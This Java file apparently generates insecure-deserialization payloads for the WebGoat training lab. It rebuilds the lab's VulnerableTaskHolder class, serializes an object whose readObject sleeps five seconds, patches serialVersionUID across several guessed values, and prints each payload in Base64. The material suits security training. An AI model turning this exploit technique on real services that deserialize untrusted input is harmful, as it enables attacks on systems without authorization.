package org.dummy.insecure.framework;

import java.io.*;
import java.util.Base64;

/**
 * Proper VulnerableTaskHolder with FULL package name
 * This matches WebGoat's expected class structure
 */
public class VulnerableTaskHolder implements Serializable {
    private static final long serialVersionUID = 1L;
    
    private String taskName;
    private String taskAction;
    private long taskTime;
    
    public VulnerableTaskHolder(String taskName, String taskAction, long taskTime) {
        this.taskName = taskName;
        this.taskAction = taskAction;
        this.taskTime = taskTime;
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        try {
            Thread.sleep(taskTime);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    
    public static void main(String[] args) {
        System.out.println("==============================================");
        System.out.println("VulnerableTaskHolder Payload Generator");
        System.out.println("Full Package: org.dummy.insecure.framework");
        System.out.println("==============================================\n");
        
        // Try multiple version numbers
        long[] versions = {1L, 2L, 3L, 4L, 5L, 10L, 100L, 1337L, 2023L, 2024L, 2025L};
        
        for (long version : versions) {
            try {
                // We'll manually set the version by modifying the serialized data
                VulnerableTaskHolder payload = new VulnerableTaskHolder(
                    "DelayTask",
                    "sleep",
                    5000L
                );
                
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(bos);
                oos.writeObject(payload);
                oos.flush();
                oos.close();
                
                byte[] serialized = bos.toByteArray();
                
                // Modify version number (bytes 38-45 for this structure)
                // Find the actual location by searching for the current version bytes
                for (int i = 0; i < serialized.length - 8; i++) {
                    // Look for 8-byte pattern that matches serialVersionUID = 1L
                    if (i > 30 && serialized[i] == 0x00 && serialized[i+1] == 0x00 && 
                        serialized[i+2] == 0x00 && serialized[i+3] == 0x00 &&
                        serialized[i+4] == 0x00 && serialized[i+5] == 0x00 &&
                        serialized[i+6] == 0x00 && serialized[i+7] == 0x01) {
                        
                        // Found it! Now replace with new version
                        long v = version;
                        serialized[i]   = (byte)((v >> 56) & 0xFF);
                        serialized[i+1] = (byte)((v >> 48) & 0xFF);
                        serialized[i+2] = (byte)((v >> 40) & 0xFF);
                        serialized[i+3] = (byte)((v >> 32) & 0xFF);
                        serialized[i+4] = (byte)((v >> 24) & 0xFF);
                        serialized[i+5] = (byte)((v >> 16) & 0xFF);
                        serialized[i+6] = (byte)((v >> 8) & 0xFF);
                        serialized[i+7] = (byte)(v & 0xFF);
                        break;
                    }
                }
                
                String base64 = Base64.getEncoder().encodeToString(serialized);
                
                System.out.println("Version " + version + ":");
                System.out.println(base64);
                System.out.println();
                
            } catch (Exception e) {
                System.err.println("Error with version " + version + ": " + e.getMessage());
            }
        }
    }
}
